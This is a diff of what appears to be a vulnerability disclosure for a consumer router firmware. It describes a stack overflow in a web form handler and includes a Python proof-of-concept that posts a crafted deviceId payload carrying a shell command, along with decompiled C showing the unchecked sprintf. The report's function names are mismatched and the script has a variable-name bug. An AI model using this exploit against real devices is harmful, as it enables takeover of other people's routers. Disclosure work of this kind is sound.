@@ -1,7 +1,14 @@
-Affected products: AC15V15.03.05.19
+## formSetSpeedWan
 
-POC:
+### Affected product
 
+```
+AC15V15.03.05.19
+```
+
+### poc
+
+```python
 import requests
 from pwn import *
 cmd=b"echo hello! "
@@ -24,4 +31,35 @@ data={"limitEn":"1","deviceId":payload,"limitSpeedUp":"a","limitSpeed":"a"}
 reponse=requests.post(url,cookies=cookie,data=data)
 
 print(response.text)
+
+```
+
+### Details
+
+```
+/goform/SetClientState，deviceId is controllable and will eventually be spliced into s by sprintf. It is worth noting that the size is not checked, resulting in a stack overflow vulnerability
+```
+
+
+
+```c
+  v9 = (const char *)sub_2BA8C(a1, (int)"deviceId", (int)&byte_E235C);
+  nptr = (char *)sub_2BA8C(a1, (int)"limitEn", (int)"0");
+  v11 = (const char *)sub_2BA8C(a1, (int)"limitSpeed", (int)"0");
+  v10 = (const char *)sub_2BA8C(a1, (int)"limitSpeedUp", (int)"0");
+ if ( v9 )
+  {
+    if ( sub_7D650(v9, &v4) == 1 )
+    {
+      v8 = 1;
+      sprintf((char *)v5, "{\"errCode\":%d}", 1);
+      result = sub_9CB14(a1, v5);
+    }
+    else
+    {
+      if ( atoi(nptr) )
+      {
+        v2 = atoi(nptr);
+        sprintf(s, "%d;%s;%s;%s", v2, v9, v10, v11);
+```
 
